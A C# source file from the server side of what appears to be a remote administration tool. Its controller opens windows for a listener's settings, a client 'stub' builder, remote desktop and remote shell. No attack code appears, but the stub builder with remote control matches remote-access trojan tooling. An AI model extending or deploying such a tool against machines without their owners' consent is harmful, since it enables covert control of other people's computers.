using Serveur.Controllers.Server;
using Serveur.Views;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    class FrmMainController
    {
        private List<ClientMosaic> _clientControllers;

        public void frmListener(FrmListenerController frmListenerController)
        {
            try
            {
                FrmListener frmListener = new FrmListener(frmListenerController);
                frmListener.Text = "settings";
                frmListener.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmListener MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //STUB
        public void frmBuilder()
        {
            try
            {
                FrmBuilder frmStub = new FrmBuilder();
                frmStub.Text = "Client Builer";
                frmStub.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmStub MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmRdp(ClientMosaic client)
        {
            try
            {
                FrmRemoteDesktop frmRemoteDesktop = new FrmRemoteDesktop(client);
                frmRemoteDesktop.Text = "Remote Desktop";
                frmRemoteDesktop.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmRdp MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmRms(ClientMosaic client)
        {
            try
            {
                FrmRemoteShell frmRemoteShell = new FrmRemoteShell(client);
                frmRemoteShell.Text = "Remote Shell";
                frmRemoteShell.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmRms MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
